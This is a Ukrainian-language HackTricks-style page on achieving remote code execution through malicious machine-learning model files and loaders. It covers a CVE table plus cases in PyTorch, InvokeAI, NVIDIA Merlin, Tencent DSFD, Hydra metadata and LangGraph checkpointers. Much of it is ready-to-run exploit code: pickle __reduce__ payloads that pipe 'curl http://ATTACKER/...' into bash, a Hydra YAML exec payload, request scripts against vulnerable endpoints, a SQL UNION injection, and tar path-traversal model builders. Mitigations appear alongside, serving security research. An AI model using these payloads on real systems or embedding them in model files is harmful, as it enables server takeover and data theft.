# RCE у моделях

{{#include ../banners/hacktricks-training.md}}

## Завантаження моделей для RCE

Моделі машинного навчання зазвичай поширюють у різних форматах, як-от ONNX, TensorFlow, PyTorch тощо. Їх завантажують на комп’ютери розробників або у виробничі системи для використання. Зазвичай моделі не повинні містити шкідливого коду, але в деяких випадках модель може виконувати довільний код у системі — як передбачену функцію або через вразливість у бібліотеці завантаження моделей.

У таблиці нижче наведено характерні вразливості цієї категорії:

| **Фреймворк / Інструмент** | **Вразливість (CVE, якщо є)** | **Вектор RCE** | **Посилання** |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Небезпечна десеріалізація в* `torch.load` **(CVE-2025-32434)** | Шкідливий pickle у контрольній точці моделі призводить до виконання коду (обхід захисту `weights_only`) | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471** | SSRF + завантаження шкідливої моделі призводить до виконання коду; RCE через десеріалізацію Java в API керування | |
| **NVIDIA Merlin Transformers4Rec** | Небезпечна десеріалізація контрольної точки через `torch.load` **(CVE-2025-23298)** | Недовірена контрольна точка запускає pickle reducer під час `load_model_trainer_states_from_checkpoint` → виконання коду в ML worker | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + небезпечний хук розширень MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Керований користувачем ключ `filter` додає синтаксис SQL/JSON-path, `UNION SELECT` підробляє рядок контрольної точки, а потім десеріалізація `msgpack` імпортує та викликає вибраний зловмисником код Python | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (небезпечний YAML) <br> **CVE-2024-3660** (Keras Lambda) | Завантаження моделі з YAML використовує `yaml.unsafe_load` (виконання коду) <br> Завантаження моделі з шаром **Lambda** виконує довільний код Python | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (розбір TFLite) | Спеціально сформована модель `.tflite` спричиняє переповнення цілого числа → пошкодження heap (потенційний RCE) | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle) | Завантаження моделі через `joblib.load` виконує pickle із payload зловмисника в `__reduce__` | |
| **NumPy** (Python)          | **CVE-2019-6446** (небезпечний `np.load`) *оспорюється* | За замовчуванням `numpy.load` дозволяв масиви об’єктів із pickle — шкідливий `.npy/.npz` запускає виконання коду | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (обхід директорій) <br> **CVE-2024-5187** (обхід директорій у tar) | Шлях до зовнішніх ваг моделі ONNX може виходити за межі директорії (читання довільних файлів) <br> Шкідливий tar-архів ONNX може перезаписувати довільні файли (що може призвести до RCE) | |
| ONNX Runtime (ризик проєктування) | *(Без CVE)* Користувацькі операції ONNX / потік керування | Модель із користувацьким оператором потребує завантаження нативного коду зловмисника; складні графи моделі зловживають логікою для виконання неочікуваних обчислень | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (обхід шляхів) | Використання API завантаження моделей із увімкненим `--model-control` дає змогу переходити за відносними шляхами й записувати файли (наприклад, перезаписати `.bashrc` для RCE) | |
| **GGML (формат GGUF)**      | **CVE-2024-25664 … 25668** (кілька переповнень heap) | Некоректний файл моделі GGUF спричиняє переповнення буфера heap у парсері, що дає змогу виконувати довільний код у системі жертви | |
| **Keras (старі формати)**   | *(Без нових CVE)* Застаріла модель Keras H5 | Шкідлива модель HDF5 (`.h5`) із шаром Lambda і далі виконує код під час завантаження (Keras safe_mode не охоплює старий формат — «downgrade attack») | |
| **Інші** (загалом)        | *Помилка проєктування* – серіалізація Pickle | Багато інструментів ML (наприклад, формати моделей на основі pickle та Python `pickle.load`) виконують довільний код, вбудований у файли моделей, якщо не вжити заходів захисту | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Недовірені метадані передаються до `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Керовані зловмисником метадані/конфігурація моделі задають `_target_` як довільний викликаний об’єкт (наприклад, `builtins.exec`) → виконується під час завантаження навіть із «безпечними» форматами (`.safetensors`, `.nemo`, репозиторний `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Крім того, існують моделі на основі Python pickle, зокрема ті, що використовуються в [PyTorch](https://github.com/pytorch/pytorch/security), які можуть виконувати довільний код у системі, якщо їх завантажують без `weights_only=True`. Тому будь-яка модель на основі pickle може бути особливо вразливою до такого типу атак, навіть якщо її не наведено в таблиці вище.

### Метадані Hydra → RCE (працює навіть із safetensors)

`hydra.utils.instantiate()` імпортує та викликає будь-який крапково-нотаційний `_target_` у конфігураційному об’єкті або об’єкті метаданих. Коли бібліотеки на кшталт Hugging Face Transformers передають **недовірені метадані моделі** до `instantiate()`, зловмисник може надати викликаний об’єкт і аргументи, які одразу виконуються під час завантаження моделі (pickle не потрібен).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Приклад payload (працює в `model_config.yaml` у `.nemo`, `config.json` репозиторію або `__metadata__` усередині `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Ключові моменти:
- Спрацьовує до ініціалізації моделі в `restore_from/from_pretrained` у NeMo, кодерах uni2TS HuggingFace та завантажувачах FlexTok.
- Рядковий block-list Hydra можна обійти альтернативними шляхами імпорту (наприклад, `enum.bltns.eval`) або іменами, які визначає застосунок (наприклад, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok також розбирає рядкові метадані за допомогою `ast.literal_eval`, що дає змогу спричинити DoS (надмірне споживання CPU/пам’яті) до виклику Hydra.

### 🆕  InvokeAI RCE через `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний вебінтерфейс із відкритим вихідним кодом для Stable-Diffusion. Версії **5.3.1 – 5.4.2** відкривають REST endpoint `/api/v2/models/install`, який дає користувачам змогу завантажувати моделі з довільних URL і завантажувати їх у систему.<sup>[[1]](#references)</sup>

Усередині endpoint зрештою викликає:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Коли наданий файл є **чекпойнтом PyTorch (`*.ckpt`)**, `torch.load` виконує **десеріалізацію pickle**. Оскільки вміст надходить безпосередньо з URL, контрольованого користувачем, зловмисник може вбудувати в чекпойнт шкідливий об’єкт із власним методом `__reduce__`; цей метод виконується **під час десеріалізації**, що призводить до **віддаленого виконання коду (RCE)** на сервері InvokeAI.

Уразливості присвоєно **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Покрокова демонстрація експлуатації

1. Створіть шкідливий чекпойнт:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Розмістіть `payload.ckpt` на HTTP-сервері, який ви контролюєте (наприклад, `http://ATTACKER/payload.ckpt`).
3. Викличте вразливий endpoint (автентифікація не потрібна):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → спрацьовує gadget `os.system`, і зловмисник отримує виконання коду в контексті процесу InvokeAI.

Готовий exploit: модуль **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.<sup>[[3]](#references)</sup>

#### Умови

•  InvokeAI 5.3.1-5.4.2 (прапорець scan за замовчуванням має значення **false**)
•  Зловмисник має доступ до `/api/v2/models/install`
•  Процес має дозволи на виконання команд оболонки

#### Заходи пом’якшення

* Оновіть до **InvokeAI ≥ 5.4.3** — у виправленні для scan задано значення `True` за замовчуванням і додано перевірку на шкідливе ПЗ перед десеріалізацією.<sup>[[2]](#references)</sup>
* Під час програмного завантаження checkpoint-файлів використовуйте `torch.load(file, weights_only=True)` або новий помічник [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Застосовуйте списки дозволених джерел моделей і перевірку підписів, а також запускайте сервіс із мінімально необхідними привілеями.

> ⚠️ Пам’ятайте: **будь-який** формат на основі Python pickle (зокрема багато файлів `.pt`, `.pkl`, `.ckpt`, `.pth`) за своєю суттю небезпечно десеріалізувати з ненадійних джерел.

---

Приклад спеціального заходу пом’якшення, якщо потрібно й надалі запускати старіші версії InvokeAI за реверсивним проксі-сервером:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 RCE у NVIDIA Merlin Transformers4Rec через unsafe `torch.load` (CVE-2025-23298)

У Transformers4Rec від NVIDIA (частина Merlin) був виявлений небезпечний loader checkpoint-файлів, який безпосередньо викликав `torch.load()` для шляхів, наданих користувачем. Оскільки `torch.load` використовує Python `pickle`, checkpoint, контрольований зловмисником, може виконати довільний код через reducer під час десеріалізації.<sup>[[5]](#references)</sup>

Вразливий шлях (до виправлення): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Чому це призводить до RCE: у Python pickle об’єкт може визначати reducer (`__reduce__`/`__setstate__`), який повертає callable та аргументи. Callable виконується під час розпакування pickle. Якщо такий об’єкт є в checkpoint, він виконується ще до використання будь-яких ваг.

Мінімальний приклад шкідливого checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Вектори доставки та радіус ураження:
- Троянізовані checkpoints/models, поширені через репозиторії, buckets або реєстри артефактів
- Автоматизовані pipelines відновлення/розгортання, які автоматично завантажують checkpoints
- Виконання відбувається всередині workers для навчання/інференсу, часто з підвищеними привілеями (наприклад, root у контейнерах)

Виправлення: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) замінив прямий виклик `torch.load()` на обмежений десеріалізатор із allowlist, реалізований у `transformers4rec/utils/serialization.py`. Новий завантажувач перевіряє типи/поля та не дозволяє викликати довільні callables під час завантаження.<sup>[[7]](#references)</sup>

Рекомендації із захисту, специфічні для PyTorch checkpoints:
- Не використовуйте unpickle для недовірених даних. За можливості надавайте перевагу форматам без виконуваного коду, таким як [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX.
- Якщо необхідно використовувати серіалізацію PyTorch, переконайтеся, що встановлено `weights_only=True` (підтримується в новіших версіях PyTorch), або використовуйте власний unpickler з allowlist, подібний до виправлення Transformers4Rec.<sup>[[4]](#references)</sup>
- Перевіряйте походження/підписи моделі та ізолюйте десеріалізацію в sandbox (seccomp/AppArmor; не-root користувач; обмежена ФС і без вихідного мережевого трафіку).
- Відстежуйте неочікувані дочірні процеси ML-сервісів під час завантаження checkpoint; відстежуйте використання `torch.load()`/`pickle`.

POC і посилання на вразливу версію/виправлення:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Вразливий завантажувач до виправлення: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC шкідливого checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Завантажувач після виправлення: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Приклад – створення шкідливої моделі PyTorch

- Створіть модель:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Завантажте модель:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD надає endpoint `resnet`, який десеріалізує дані, контрольовані користувачем. ZDI підтвердила, що віддалений зловмисник може змусити жертву завантажити шкідливу сторінку/файл, надіслати з нього до цього endpoint спеціально сформований серіалізований blob і запустити десеріалізацію від імені `root`, що призведе до повної компрометації.

Схема експлуатації повторює типове зловживання pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Будь-який gadget, доступний під час десеріалізації (конструктори, `__setstate__`, callback-и фреймворку тощо), можна weaponize так само — незалежно від того, чи передавання відбувалося через HTTP, WebSocket або файл, поміщений у каталог, за яким стежать.



### LangGraph checkpointer SQLi → MessagePack RCE

Цей ланцюжок атак цікавий тим, що зловмиснику **не потрібно завантажувати шкідливий файл моделі**. Натомість застосунок надає **API для збереження стану AI-агента** (`get_state_history(..., filter=...)`), а користувацьке введення потрапляє до конструктора запитів checkpointer.

#### 1. Структурна SQLi у фільтрах метаданих

Вразливий шаблон SQLite виглядав так:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Значення прив’язується пізніше, але `query_key` конкатенується в **рядок JSON path**, тож `'` усередині ключа словника виходить за межі `'$.{query_key}'` і впроваджує SQL. Те саме стосується **JSON paths, ідентифікаторів, операторів, `LIMIT` і полів TTL**: плейсхолдери захищають лише значення, а не структурний синтаксис запиту.

#### 2. `UNION SELECT` може націлюватися на подальші точки обробки, а не лише на крадіжку даних

Запит повертає `type` і серіалізовані байти `checkpoint`, які згодом використовуються як:

```python
self.serde.loads_typed((type, checkpoint))
```

Це означає, що SQLi в умові `WHERE` може впровадити **фальшивий рядок результату**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Якщо подальший код аналізує, десеріалізує, записує чи виконує будь-який вибраний стовпець, зіставте ці стовпці з відповідними sinks. У цьому випадку фальшивий рядок перетворює SQLi на **десеріалізацію, контрольовану зловмисником**.

#### 3. Небезпечні хуки розширень MessagePack еквівалентні code gadgets

Шлях `msgpack` у LangGraph використовував власний хук розширення, який розпаковував вкладений кортеж і виконував:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Отже, об’єкт розширення MessagePack, що кодує щось еквівалентне `("os", "system", "id > /tmp/pwned")`, імпортує `os`, знаходить `system` і запускає команду. Під час аудиту AI-фреймворків перевіряйте **власні reviver-и MessagePack/JSON/pickle** на наявність динамічного імпорту, рефлексії або довільного виклику callable-об’єктів.

#### 4. Практичний шаблон аудиту agent-фреймворків

Перевіряйте будь-які контрольовані користувачем дані, що надходять до:
- API для переліку історії стану / пам’яті / відтворення / контрольних точок
- конструкторів структурованих фільтрів, які генерують SQL або фрагменти запитів Redis
- власних десеріалізаторів (`pickle`, `msgpack`, хуків об’єктів `json`, конструкторів YAML)
- шляхів відновлення, які довіряють рядкам, отриманим із рівня збереження даних

Цей конкретний ланцюжок впливав на self-hosted розгортання LangGraph із checkpointer-ами **SQLite** або **Redis**, коли недовірені користувачі могли контролювати `filter`. У повідомленні про вразливість зазначалися виправлені версії: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` і `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Моделі для Path Traversal

Як зазначено в [**цьому дописі в блозі**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, що використовуються різними AI-фреймворками, базуються на архівах, зазвичай `.zip`. Тому ці формати можна потенційно використати для атак Path Traversal, що дасть змогу читати довільні файли в системі, де завантажується модель.<sup>[[16]](#references)</sup>

Наприклад, за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить файл у каталозі `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Або за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створюватиме symlink на каталог `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Поглиблений розгляд: десеріалізація Keras .keras і пошук gadget

Щоб ознайомитися з внутрішньою будовою .keras, RCE через Lambda-layer, проблемою довільного імпорту у версіях ≤ 3.8 і пошуком gadget після виправлення в allowlist, див.:

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Блог OffSec – «CVE-2024-12029 – десеріалізація ненадійних даних в InvokeAI»](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Коміт виправлення InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Документація модуля Metasploit від Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – міркування щодо безпеки torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Блог ZDI – CVE-2025-23298: отримання віддаленого виконання коду в NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Рекомендація ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Коміт виправлення Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Вразливий завантажувач до виправлення (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC шкідливого checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Завантажувач після виправлення (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – віддалене виконання коду в сучасних форматах і бібліотеках AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Документація Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Коміт блок-листа Hydra (попередження про RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – від SQLi до RCE: експлуатація Checkpointer у LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Використання вразливостей Archive Slip для отримання цінних AI/ML баунті](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
